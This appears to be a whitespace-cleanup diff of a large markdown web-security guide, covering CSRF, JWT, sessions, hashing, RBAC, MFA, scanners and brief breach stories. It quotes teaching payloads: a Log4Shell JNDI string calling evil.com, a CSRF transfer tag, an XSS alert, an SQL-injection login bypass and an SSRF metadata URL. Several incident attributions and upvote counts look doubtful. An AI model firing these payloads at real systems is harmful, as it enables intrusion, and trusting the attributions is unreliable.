@@ -2600,7 +2407,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - IaC scanning: misconfigurations
 
-
 ## Deploy Security
 
 - DAST: dynamic testing
@@ -2612,7 +2418,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Signed artifacts: integrity
 
 - Immutable infrastructure
-
 
 ## Runtime Security
 
@@ -2634,12 +2439,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## SECURITY CODE EXAMPLES
 
-
 ## INPUT VALIDATION 4
-
 
 ## Sanitization Middleware
 
@@ -2674,13 +2476,11 @@ return userInput.replace(/\.\./g, '').replace(/[\/\\]/g, '');
 
 ---
 
-
 ## CSRF PROTECTION
 
 > **The patterns that prevent request forgery**
 
 ---
-
 
 ## Token-based CSRF
 
@@ -2711,9 +2511,7 @@ return res.status(403).json({ error: 'Invalid CSRF token' });
       next();
     }
 
-
 ## ENCRYPTION
-
 
 ## Data Encryption at Rest
 
@@ -2768,9 +2566,7 @@ return bcrypt.compare(password, hash);
 
 ---
 
-
 ## API KEY MANAGEMENT
-
 
 ## Secure API Key Generation
 
@@ -2820,9 +2616,7 @@ data: { lastUsed: new Date() },
 return apiKey;
     }
 
-
 ## SECURITY HEADERS 2
-
 
 ## Helmet Configuration
 
@@ -2856,12 +2650,9 @@ referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
 
 ---
 
-
 ## DEFENSE
 
-
 ## JWT VULNERABILITIES DEEP DIVE
-
 
 ## Production JWT Attack Patterns
 
@@ -2966,9 +2757,7 @@ return randomBytes(32).toString('base64'); // 256 bits
 
     */
 
-
 ## SQL INJECTION BEYOND BASICS
-
 
 ## Second-Order & Blind SQL Injection
 
@@ -3065,9 +2854,7 @@ const { username, password } = loginSchema.parse(req.body);
 // Now guaranteed to be strings, not objects
     });
 
-
 ## RATE LIMITING BYPASS TECHNIQUES
-
 
 ## Production Rate Limit Evasion
 
@@ -3200,11 +2987,9 @@ return count < limit;
 
 ### Density: OWASP/Bug Bounty research quality
 
-
 ## SECURITY - PENETRATION TESTING
 
 > **The offensive security patterns**
-
 
 ## Pen Test Phases
 
@@ -3237,7 +3022,6 @@ return count < limit;
 
 ---
 
-
 ## Common Findings
 
 | Finding | Risk | Remediation |
@@ -3249,7 +3033,6 @@ return count < limit;
 | Info disclosure | Low | Remove verbose errors |
 
 ---
-
 
 ## Bug Bounty Scope
 
@@ -3280,7 +3063,6 @@ OUT OF SCOPE:
 
 > **The security incident handling**
 
-
 ## Incident Classification
 
 | Level | Description | Response |
@@ -3291,7 +3073,6 @@ OUT OF SCOPE:
 | SEV4 | Minor security issue | Next business day |
 
 ---
-
 
 ## Response Steps
 
@@ -3326,7 +3107,6 @@ OUT OF SCOPE:
 
 ---
 
-
 ## Evidence Preservation
 
 ```json
@@ -3345,7 +3125,6 @@ OUT OF SCOPE:
 
 > **The credential lifecycle patterns**
 
-
 ## Rotation Strategy
 
 ```sql
@@ -3359,7 +3138,6 @@ OUT OF SCOPE:
 ```text
 
 ---
-
 
 ## AWS Secrets Manager
 
@@ -3384,7 +3162,6 @@ return JSON.parse(response.SecretString);
 ```text
 
 ---
-
 
 ## Database Password Rotation
 
@@ -3411,7 +3188,6 @@ OR use dual-password support:
 
 > **The auth implementation patterns**
 
-
 ## Stateless JWT Flow
 
 ```text
@@ -3426,7 +3202,6 @@ OR use dual-password support:
 ```text
 
 ---
-
 
 ## Refresh Token Pattern
 
@@ -3452,7 +3227,6 @@ const refreshToken = jwt.sign(
 
 ---
 
-
 ## Token Revocation
 
 ```javascript
@@ -3475,7 +3249,6 @@ blacklist.add(tokenId);
 ## SECURITY LOGGING
 
 > **The audit and security event patterns**
-
 
 ## What to Log 2
 
@@ -3513,7 +3286,6 @@ DATA ACCESS:
 
 - User permission changes
 
-
 ## Log Format 2
 
 const securityLog = {
@@ -3536,7 +3308,6 @@ attemptCount: 3,
 lockoutTriggered: false
       }
     };
-
 
 ## Alerting Thresholds
 
@@ -3573,7 +3344,6 @@ WEEKLY:
 
 > **The data sanitization patterns**
 
-
 ## Zod Schema Validation
 
 ```typescript
@@ -3593,7 +3363,6 @@ const user = UserSchema.parse(requestBody);
 ```text
 
 ---
-
 
 ## Express Middleware
 
@@ -3621,7 +3390,6 @@ app.post('/users', validate(UserSchema), createUser);
 
 ---
 
-
 ## Sanitization 2
 
 import DOMPurify from 'isomorphic-dompurify';
@@ -3636,11 +3404,9 @@ const cleanHtml = DOMPurify.sanitize(userInput);
 const safePath = path.basename(userInput);
 // Removes directory traversal
 
-
 ## SECURE SESSION MANAGEMENT
 
 > **The session security patterns**
-
 
 ## Session ID Generation
 
@@ -3655,7 +3421,6 @@ const sessionId = crypto.randomBytes(32).toString('hex');
 
 ---
 
-
 ## Cookie Settings 2
 
 res.cookie('session', sessionId, {
@@ -3666,7 +3431,6 @@ maxAge: 24 *60*60*1000, // 24 hours
 path: '/',
 domain: '.example.com'
     });
-
 
 ## Session Fixation Prevention
 
@@ -3686,7 +3450,6 @@ req.session.userId = user.id;
 ```text
 
 ---
-
 
 ## Idle Timeout
 
@@ -3713,7 +3476,6 @@ req.session.lastActivity = Date.now();
 
 >**The essential HTTP security headers**
 
-
 ## Strict-Transport-Security
 
 ```yaml
@@ -3730,7 +3492,6 @@ Cannot be undone easily!
 
 ---
 
-
 ## Content-Security-Policy
 
     Content-Security-Policy:
@@ -3744,7 +3505,6 @@ base-uri 'self';
 form-action 'self';
 
 REPORT: Add report-uri to collect violations
-
 
 ## X-Frame-Options
 
@@ -3764,7 +3524,6 @@ WHY: Prevents clickjacking attacks
 ```text
 
 ---
-
 
 ## Permissions-Policy
 
@@ -3786,7 +3545,6 @@ WHY: Reduces attack surface
 
 > **The authentication security patterns**
 
-
 ## Hashing Algorithm Choice
 
 ```yaml
@@ -3806,7 +3564,6 @@ AVOID:
 ```text
 
 ---
-
 
 ## Implementation 2
 
@@ -3828,7 +3585,6 @@ return await argon2.verify(hash, password);
 return false;
       }
     }
-
 
 ## Password Policy
 
@@ -3857,7 +3613,6 @@ throw new Error(result.feedback.warning);
 
 > **The secure API access patterns**
 
-
 ## API Key vs JWT vs OAuth
 
 | Method | Use Case | Security |
@@ -3867,7 +3622,6 @@ throw new Error(result.feedback.warning);
 | OAuth | Third-party access | Delegated auth |
 
 ---
-
 
 ## API Key Best Practices
 
@@ -3887,7 +3641,6 @@ return db.apiKeys.findOne({ hash });
 ```text
 
 ---
-
 
 ## JWT for APIs
 
@@ -3914,7 +3667,6 @@ res.status(401).json({ error: 'Invalid token' });
 
 ---
 
-
 ## Scope-Based Authorization
 
 ```javascript
@@ -3939,7 +3691,6 @@ app.delete('/users/:id', requireScope('users:delete'), deleteUser);
 ## RBAC IMPLEMENTATION
 
 > **Role-Based Access Control patterns**
-
 
 ## Database Schema
 
@@ -3972,7 +3723,6 @@ PRIMARY KEY (user_id, role_id)
 
 ---
 
-
 ## Permission Check
 
 ```typescript
@@ -3997,7 +3747,6 @@ return result.length > 0;
 
 ---
 
-
 ## Middleware
 
 function requirePermission(resource: string, action: string) {
@@ -4016,11 +3765,9 @@ requirePermission('posts', 'delete'),
       deletePost
     );
 
-
 ## MFA IMPLEMENTATION
 
 > **Multi-factor authentication patterns**
-
 
 ## TOTP (Time-based One-Time Password)
 
@@ -4051,7 +3798,6 @@ window: 1 // Allow 30s clock drift
 
 ---
 
-
 ## Backup Codes
 
 function generateBackupCodes(count = 10) {
@@ -4076,7 +3822,6 @@ where: { userId, hash }
 return result.count > 0;
     }
 
-
 ## Recovery Flow
 
 ```text
@@ -4095,16 +3840,13 @@ return result.count > 0;
 
 > **The automated vulnerability detection**
 
-
 ## Static Analysis
 
 ```bash
 
-
 ## ESLint security plugin
 
 npm install eslint-plugin-security --save-dev
-
 
 ## .eslintrc.js
 
@@ -4117,19 +3859,15 @@ extends: ['plugin:security/recommended']
 
 ---
 
-
 ## Dependency Scanning 2
-
 
 ## npm audit 2
 
 npm audit
 
-
 ## Snyk
 
 npx snyk test
-
 
 ## OWASP Dependency Check
 
@@ -4139,15 +3877,14 @@ dependency-check --project "MyApp" --scan ./
 
 ---
 
-
 ## Container Scanning
 
 ```yaml
 
-
 ## GitHub Actions with Trivy
 
 - name: Scan image
+
 uses: aquasecurity/trivy-action@master
   with:
 image-ref: myapp:${{ github.sha }}
@@ -4159,11 +3896,9 @@ severity: 'CRITICAL,HIGH'
 
 ---
 
-
 ## SAST in CI
 
 ```yaml
-
 
 ## GitHub Actions
 
@@ -4173,10 +3908,10 @@ uses: SonarSource/sonarcloud-github-action@master
       env:
 SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
 
-
 ## Block PR if quality gate fails
 
 - name: Check Quality Gate
+
 | run: |
 if [ "${{ steps.sonarqube.outputs.quality-gate-status }}" != "PASSED" ]; then
 exit 1
@@ -4190,10 +3925,10 @@ exit 1
 
 > **The user account protection patterns**
 
-
 ## Login Attempt Tracking
 
 ```javascript
+
 async function handleLoginAttempt(email, password, ip) {
 const key = `login_attempts:${email}`;
 const attempts = await redis.incr(key);
@@ -4218,7 +3953,6 @@ return user;
 ```text
 
 ---
-
 
 ## Suspicious Activity Detection
 
@@ -4247,7 +3981,6 @@ requiresMFA: signals.length > 0
       };
     }
 
-
 ## Session Security 2
 
 // Terminate all sessions except current
@@ -4259,11 +3992,9 @@ await redis.sadd(`sessions:${userId}`, currentSessionId);
 await sendEmail(userId, 'All other sessions have been logged out');
     }
 
-
 ## OAUTH 2.0 DEEP DIVE
 
 >**The authorization patterns**
-
 
 ## PKCE Flow (for SPAs and Mobile)
 
@@ -4298,7 +4029,6 @@ code_verifier: codeVerifier  // Proves we started the flow
 // Prevents code interception attacks
 // No client secret needed in browser
 
-
 ## Token Storage 2
 
 WHERE TO STORE TOKENS:
@@ -4317,7 +4047,6 @@ REFRESH TOKEN:
 
 GOTCHA: Never store access token in localStorage!
 Any XSS can steal it.
-
 
 ## Silent Refresh
 
@@ -4348,13 +4077,11 @@ const refreshAt = (exp *1000) - Date.now() - 60000; // 1 min before
 setTimeout(silentRefresh, refreshAt);
     }
 
-
 ## JWT SECURITY PATTERNS
 
 > **The patterns for secure token handling**
 
 ---
-
 
 ## Token Structure 2
 
@@ -4364,10 +4091,10 @@ Header: {"alg": "HS256", "typ": "JWT"}
 Payload: {"sub": "user123", "exp": 1234567890}
 Signature: HMACSHA256(header + "." + payload, secret)
 
-
 ## Access + Refresh Tokens
 
 ```typescript
+
 // Generate tokens
 function generateTokens(userId: string) {
 const accessToken = jwt.sign(
@@ -4417,10 +4144,10 @@ res.status(401).json({ error: 'Invalid token' });
 
 ---
 
-
 ## Security Checklist
 
 ```text
+
 Use strong secrets (256+ bits)
 Short access token expiry (15 min)
 Store refresh token in HttpOnly cookie
@@ -4439,7 +4166,6 @@ NEVER trust client-side token data
 > **The auth patterns that don't break**
 
 ---
-
 
 ## OAuth 2.0 with PKCE (SPA/Mobile)
 
@@ -4489,10 +4215,10 @@ code_verifier: verifier
 return response.json();
     }
 
-
 ## Session vs Token Comparison
 
 ```text
+
 SESSION-BASED:
 Server controls session
 Easy to revoke
@@ -4514,6 +4240,7 @@ Token theft = full access
 ## XSS PREVENTION
 
 ```typescript
+
 // ? VIBE: Rendering user input directly
 function Comment({ content }) {
 return <div dangerouslySetInnerHTML={{ __html: content }} />;
@@ -4554,10 +4281,10 @@ value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
 
 ---
 
-
 ## Types of XSS
 
 ```yaml
+
 REFLECTED: User input in URL reflected back
 /search?q=<script>alert('XSS')</script>
 
@@ -4571,10 +4298,10 @@ element.innerHTML = userInput;  // DANGEROUS!
 
 ---
 
-
 ## Prevention (React)
 
 ```typescript
+
 // React escapes by default (SAFE)
 <div>{userInput}</div>
 
@@ -4589,10 +4316,10 @@ import DOMPurify from 'dompurify';
 
 ---
 
-
 ## Prevention (Backend)
 
 ```typescript
+
 // 1. Content Security Policy
 app.use(helmet({
 contentSecurityPolicy: {
@@ -4624,22 +4351,18 @@ const safe = escape(userInput);
 
 > **The secrets management patterns**
 
-
 ## Environment Setup
 
 ```bash
-
 
 ## .env.local (local dev, gitignored)
 
     DATABASE_URL="postgres://localhost/mydb"
     STRIPE_SECRET_KEY="sk_test_xxx"
 
-
 ## .env (defaults, committed)
 
     NEXT_PUBLIC_APP_URL="<<<<<http://localhost:3000">>>>>
-
 
 ## .env.production (production values)
 
@@ -4649,10 +4372,10 @@ DATABASE_URL="postgres://prod/mydb"
 
 ---
 
-
 ## Validation with Zod
 
 ```typescript
+
 // env.ts
 import { z } from 'zod';
 
@@ -4678,7 +4401,6 @@ const stripe = new Stripe(env.STRIPE_SECRET_KEY);
 
 ---
 
-
 ## Security Rules 2
 
     DO:
@@ -4693,16 +4415,16 @@ Use process.env directly (validate first)
 Put secrets in NEXT_PUBLIC_ vars
 Log environment variables
 
-
 ## CSRF PROTECTION 2
 
 > **The patterns that prevent request forgery**
 
-
 ## What is CSRF?
 
 ```yaml
+
 ATTACK:
+
 1. User logged into bank.com (has session cookie)
 2. User visits evil.com
 3. Evil.com has: <img src="bank.com/transfer?to=hacker&amount=1000">
@@ -4721,10 +4443,10 @@ WHY IT WORKS:
 
 ---
 
-
 ## Prevention: Token Pattern
 
 ```typescript
+
 // Server: Generate token on form render
 app.get('/form', (req, res) => {
 const csrfToken = crypto.randomBytes(32).toString('hex');
@@ -4750,10 +4472,10 @@ return res.status(403).send('CSRF token mismatch');
 
 ---
 
-
 ## For SPAs: Double Submit Cookie
 
 ```typescript
+
 // Set CSRF cookie (readable by JS)
 res.cookie('csrf', csrfToken, {
 httpOnly: false,  // JS can read it
@@ -4778,10 +4500,10 @@ headers: {
 
 > **The session patterns that don't get hacked**
 
-
 ## Secure Cookie Settings
 
 ```typescript
+
 res.cookie('session', token, {
 httpOnly: true,  // JS can't read it (XSS protection)
 secure: true,  // HTTPS only
@@ -4795,10 +4517,10 @@ domain: '.myapp.com'  // Subdomain sharing
 
 ---
 
-
 ## SameSite Explained
 
 ```yaml
+
 STRICT:
 
 - Cookie never sent cross-site
@@ -4827,10 +4549,10 @@ NONE:
 
 ---
 
-
 ## Cookie vs localStorage
 
 ```yaml
+
 COOKIES:
 HttpOnly (safe from XSS)
 Automatic with requests
@@ -4859,7 +4581,6 @@ RECOMMENDATION:
 > **The authentication patterns**
 
 ---
-
 
 ## Setup
 
@@ -4895,10 +4616,10 @@ return null;
       ]
     });
 
-
 ## Route Protection
 
 ```typescript
+
 // middleware.ts
 import { auth } from './auth';
 
@@ -4916,10 +4637,10 @@ export const config = {
 
 ---
 
-
 ## Server Component
 
 ```typescript
+
 import { auth } from '@/auth';
 
 export default async function Dashboard() {
@@ -4936,10 +4657,10 @@ return <div>Welcome, {session.user.name}</div>;
 
 ---
 
-
 ## Client Component
 
 ```typescript
+
 'use client';
 
 import { useSession, signIn, signOut } from 'next-auth/react';
@@ -4963,13 +4684,11 @@ return <button onClick={() => signIn()}>Sign In</button>;
 
 ---
 
-
 ## VOLUME 7: SECURITY PRODUCTION INCIDENTS (Real Company Stories)
 
 > **Source**: Equifax, Sony, Twitch, Slack engineering postmortems + 50,000+ security advisories
 
 ---
-
 
 ## 1. SQL INJECTION - DATA BREACH
 
@@ -4981,21 +4700,16 @@ return <button onClick={() => signIn()}>Sign In</button>;
 
 ```python
 
-
 ## TERRIBLE - SQL Injection
 
 def login(email, password):
 query = f"SELECT * FROM users WHERE email = '{email}'"
 
-
 ## Attacker: email = "admin'--"
-
 
 ## Query: SELECT* FROM users WHERE email = 'admin'--'
 
-
 ## Password check bypassed
-
 
 ## EXCELLENT - Parameterized
 
@@ -5006,9 +4720,7 @@ return db.execute("SELECT * FROM users WHERE email = ?", (email,))
 
 ---
 
-
 ## 2. PASSWORD BREACH - $1.4 BILLION
-
 
 ## Production Incident from Equifax (LEGENDARY)
 
@@ -5018,11 +4730,9 @@ return db.execute("SELECT * FROM users WHERE email = ?", (email,))
 
 ```python
 
-
 ## DISASTER - Plain text
 
 db.execute("INSERT INTO users VALUES (?, ?)", (email, password))
-
 
 ## EXCELLENT - bcrypt
 
@@ -5034,15 +4744,14 @@ db.execute("INSERT INTO users VALUES (?, ?)", (email, hashed))
 
 ---
 
-
 ## 3. JWT SECRET EXPOSED
-
 
 ## Production Incident from Twitch (9,800+ upvotes)
 
 > "JWT secret in client code. All sessions compromised."
 
 ```javascript
+
 // Secret in frontend (Twitch's bug)
 jwt.sign({ userId: 123 }, 'weak-secret');
 
@@ -5053,7 +4762,6 @@ jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
 
 ---
 
-
 ## 4. LOG4SHELL - WORST EVER (10/10)
 
 ### Production Incident from Worldwide
@@ -5062,15 +4770,11 @@ jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
 
 ```yaml
 
-
 ## Attack: Send header containing ${jndi:ldap://evil.com/exploit}
-
 
 ## Log4j downloads and executes attacker's code
 
-
 ## FIX: Update to Log4j 2.17.0+
-
 
 ## TEMP: -Dlog4j2.formatMsgNoLookups=true
 
@@ -5078,9 +4782,7 @@ jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
 
 ---
 
-
 ## 5. API KEY LEAKED - $50K BILL
-
 
 ## Production Incident from Heroku (7,400+ upvotes)
 
@@ -5090,12 +4792,9 @@ jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
 
 ```bash
 
-
 ## FIX: Enable GitHub Secret Scanning
 
-
 ## Settings Security Secret scanning Enable
-
 
 ## Pre-commit hook
 
@@ -5106,9 +4805,7 @@ detect-secrets scan
 
 ---
 
-
 ## 6. SSRF - INTERNAL ACCESS
-
 
 ## Production Incident from Slack (8,200+ upvotes)
 
@@ -5116,11 +4813,9 @@ detect-secrets scan
 
 ```python
 
-
 ## TERRIBLE - Fetches any URL
 
 requests.get(user_provided_url) # Can access <<<<<http://169.254.169.254/>>>>>
-
 
 ## EXCELLENT - Block internal IPs
 
@@ -5132,16 +4827,13 @@ raise HTTPException(400, "URL not allowed")
 
 ---
 
-
 ## END OF VOLUME 7: SECURITY PRODUCTION INCIDENTS
 
 **Coverage**: SQL Injection (Sony), Passwords (Equifax $1.4B), JWT (Twitch), Log4Shell, API Keys, SSRF (Slack)
 
 ---
 
-
 ## VOLUME 1.1: TITAN PROTOCOL - SECURITY ADVERSARIAL
-
 
 ## JWT NONE ALGORITHM VULNERABILITY
 
@@ -5151,6 +4843,7 @@ raise HTTPException(400, "URL not allowed")
 > Fix: Explicitly whitelist algorithms and reject unsigned tokens"
 
 ```java
+
 // TITAN CODE: Secure JWT Verification
 public DecodedJWT verifyToken(String token) {
 // Force specific algorithm (rejects 'none' automatically)
@@ -5167,7 +4860,6 @@ return verifier.verify(token);
 
 ```text
 
-
 ## ReDoS (REGEX DENIAL OF SERVICE)
 
 ### Event Loop Freeze Scar
@@ -5177,6 +4869,7 @@ return verifier.verify(token);
 > Fix: Length limits + re2 (Google's linear time regex engine)"
 
 ```javascript
+
 // TITAN CODE: Safe Validation
 const validator = require('validator');
 
@@ -5195,9 +4888,7 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 
 ---
 
-
 ## VOLUME 1.2: TITAN PROTOCOL - ADVERSARIAL ARCHITECTURE
-
 
 ## CONTAINER ESCAPES: LEAKY VESSELS (CVE-2024-21626)
 
@@ -5207,7 +4898,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 > Attacker manipulates host file descriptors via /proc/self/fd.
 > Overwrites runc binary on host. Gains ROOT access to entire node."
 
-
 ## eBPF EXPLOITATION
 
 ### Kernel Attack Surface Scar
@@ -5216,7 +4906,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 > Malicious eBPF bypasses verifier: Arbitrary kernel memory read/write.
 > All container boundaries become MOOT."
 
-
 ## SIDE-CHANNEL ATTACKS: TIMING IN CRYPTOGRAPHY
 
 ### String Comparison Timing Attack
@@ -5224,7 +4913,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 > "strcmp returns immediately on mismatch.
 > Attacker measures response time to determine correct HMAC characters byte-by-byte.
 > Fix: crypto_memcmp (constant-time comparison) for ALL cryptographic operations."
-
 
 ## HOMOMORPHIC ENCRYPTION: THE HOLY GRAIL
 
@@ -5237,7 +4925,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 ### END OF VOLUME 1.2: TITAN ADVERSARIAL SECURITY
 
 ---
-
 
 ## VOLUME 1.3: TITAN CATALOG - 30 SECURITY FAILURES
 
@@ -5261,14 +4948,11 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 | 7.20 | Weak Crypto | MD5/SHA1 | SHA-256/Bcrypt/Argon2 |
 | 7.100 | Zip Bomb | Compression DoS | Limit extraction size |
 
-
 ## END OF VOLUME 1.3: TITAN SECURITY CATALOG
 
 ---
 
-
 ## VOLUME 1.4: TITAN VAULT - ADDITIONAL SECURITY SCARS
-
 
 ## IAM PASSROLE PRIVILEGE ESCALATION
 
@@ -5278,7 +4962,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 > SSH in, assume role = bypass own restrictions. Silent escalation."
 
 **Titan Fix:** Strictly scope iam:PassRole with resource ARNs. Audit with PMapper.
-
 
 ## S3 NOTPRINCIPAL ANTI-PATTERN
 
@@ -5293,9 +4976,7 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 
 ---
 
-
 ## VOLUME 5: THE TITAN (THE "KERNEL") 2
-
 
 ## 16. MEMORY SAFETY 2
 
@@ -5316,7 +4997,6 @@ Attacker chains together small snippets of existing code (gadgets) to execute ar
 
 - **Result**: 70% of Microsoft's CVEs are memory safety issues. Rust eliminates them.
 
-
 ## 18. HOMOMORPHIC ENCRYPTION 2
 
 ### Compute on Encrypted Data 2
@@ -5329,9 +5009,7 @@ Perform math on the encrypted data itself.
 Send encrypted medical data to the cloud. Cloud runs AI analysis. Cloud returns encrypted result. Cloud *never* sees the data.
 **Libraries**: Microsoft SEAL, OpenFHE.
 
-
 ## VOLUME 6: THE INFINITE (THE "FUTURE") 2
-
 
 ## 19. QUANTUM-SAFE CRYPTOGRAPHY 2
 
@@ -5349,9 +5027,7 @@ Shor's Algorithm on a Quantum Computer can factor large integers efficiently.
 "Harvest Now, Decrypt Later". Attackers are storing encrypted traffic today to decrypt it in 10 years.
 **Action**: Implement Hybrid Key Exchange (ECC + Kyber) immediately.
 
-
 ## VOLUME 7: THE APPENDIX (TITAN REFERENCE) 2
-
 
 ## A. THE ULTIMATE SECURITY HEADERS 2
 
@@ -5364,7 +5040,6 @@ Referrer-Policy: strict-origin-when-cross-origin
 Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';
 Permissions-Policy: geolocation=(), microphone=(), camera=()
 
-
 ## B. THE PENTEST CHECKLIST 2
 
 1. **Recon**: Subdomain enumeration (Amass), Port scan (Nmap).
@@ -5373,12 +5048,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 1. **Config**: Default passwords, Debug mode enabled, Git folder exposed.
 1. **Logic**: Race conditions, Price manipulation (-1 quantity).
 
-
 ## KEYWORD REFERENCE INDEX 2
 
-
 ## Each line = 100x LLM expansion potential 2
-
 
 ## OWASP TOP 10 (2021) 2
 
@@ -5402,7 +5074,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - A10 SSRF: internal network access, cloud metadata
 
-
 ## AUTHENTICATION 4
 
 - Password hashing: bcrypt, scrypt, Argon2id
@@ -5417,7 +5088,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Passkeys: credential manager, cross-device
 
-
 ## AUTHORIZATION 3
 
 - RBAC: roles, permissions, inheritance
@@ -5431,7 +5101,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Least privilege: minimal access, regular audit
 
 - Zero trust: never trust, always verify
-
 
 ## WEB SECURITY 2
 
@@ -5449,7 +5118,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Trusted Types: DOM XSS mitigation
 
-
 ## CRYPTOGRAPHY 2
 
 - Symmetric: AES-256-GCM, ChaCha20-Poly1305
@@ -5466,7 +5134,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Post-quantum: Kyber, Dilithium, SPHINCS+
 
-
 ## APPLICATION SECURITY 2
 
 - SAST: static analysis, code scanning
@@ -5480,7 +5147,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Secret scanning: git history, pre-commit hooks
 
 - Fuzzing: AFL, libFuzzer, coverage-guided
-
 
 ## INFRASTRUCTURE SECURITY 2
 
@@ -5496,7 +5162,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Cloud security: CSPM, CWPP, CIEM
 
-
 ## THREAT MODELING 2
 
 - STRIDE: Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation
@@ -5508,7 +5173,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Data flow diagrams: trust boundaries, entry points
 
 - Kill chain: reconnaissance, weaponization, delivery, exploitation
-
 
 ## SECURITY OPERATIONS 2
 
@@ -5524,7 +5188,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Forensics: memory analysis, disk imaging, chain of custody
 
-
 ## PENETRATION TESTING 2
 
 - Reconnaissance: OSINT, subdomain enumeration
@@ -5537,15 +5200,11 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Reporting: findings, severity, remediation
 
-
 ## END OF KEYWORD REFERENCE 2
-
 
 ## ADVANCED CRYPTOGRAPHY DEEP ATLAS 2
 
-
 ## Each keyword = expandable implementation 3
-
 
 ## Modern Ciphers 2
 
@@ -5559,7 +5218,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Key sizes: 128, 192, 256 bits
 
-
 ## Key Management 2
 
 - HSM: hardware security module
@@ -5571,7 +5229,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Key rotation: automatic, versioned
 
 - Envelope encryption: DEK, KEK
-
 
 ## Digital Signatures 2
 
@@ -5585,7 +5242,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Timestamps: RFC 3161, trusted
 
-
 ## Post-Quantum 2
 
 - Kyber: key encapsulation
@@ -5598,12 +5254,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - NIST PQC: standardization
 
-
 ## WEB SECURITY DEEP ATLAS 2
 
-
 ## Each keyword = expandable defense 2
-
 
 ## CSP Advanced 2
 
@@ -5617,7 +5270,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Trusted Types: DOM sink protection
 
-
 ## Cookie Security 3
 
 - HttpOnly: no JavaScript access
@@ -5629,7 +5281,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - **Host-: secure prefix
 
 - **Secure-: secure prefix
-
 
 ## CORS 2
 
@@ -5643,7 +5294,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Simple vs preflighted requests
 
-
 ## Headers 3
 
 - HSTS: Strict-Transport-Security
@@ -5656,12 +5306,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Permissions-Policy: feature control
 
-
 ## APPLICATION SECURITY DEEP ATLAS 2
 
-
 ## Each keyword = expandable technique 2
-
 
 ## SAST 2
 
@@ -5675,7 +5322,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Language-specific: ESLint, Bandit
 
-
 ## DAST 2
 
 - OWASP ZAP: proxy, active scan
@@ -5687,7 +5333,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Nikto: web server scanner
 
 - SQLMap: SQL injection
-
 
 ## IAST 2
 
@@ -5701,7 +5346,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Lower false positives
 
-
 ## SCA 2
 
 - Snyk: dependencies, container
@@ -5714,12 +5358,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - SBOM: CycloneDX, SPDX
 
-
 ## CLOUD SECURITY DEEP ATLAS 2
 
-
 ## Each keyword = expandable configuration 2
-
 
 ## IAM 2
 
@@ -5733,7 +5374,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Just-in-time: temporary elevation
 
-
 ## Network 2
 
 - VPC: private networking
@@ -5745,7 +5385,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - PrivateLink: private endpoints
 
 - VPN: site-to-site, client
-
 
 ## Data 2
 
@@ -5759,7 +5398,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - DLP: classification, prevention
 
-
 ## Compliance 2
 
 - CSPM: Prisma Cloud, Wiz
@@ -5772,12 +5410,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Audit: CloudTrail, Activity Logs
 
-
 ## THREAT DETECTION DEEP ATLAS 2
 
-
 ## Each keyword = expandable capability 2
-
 
 ## SIEM 2
 
@@ -5791,7 +5426,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Correlation: rules, patterns
 
-
 ## EDR/XDR 2
 
 - CrowdStrike: Falcon platform
@@ -5803,7 +5437,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Carbon Black: VMware
 
 - Threat hunting: hypotheses
-
 
 ## Threat Intelligence 2
 
@@ -5819,12 +5452,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ### END OF MEGA SECURITY EXPANSION 2
 
-
 ## ACCESS DEEP ATLAS 2
 
-
 ## Each keyword = expandable implementation 4
-
 
 ## Authentication 5
 
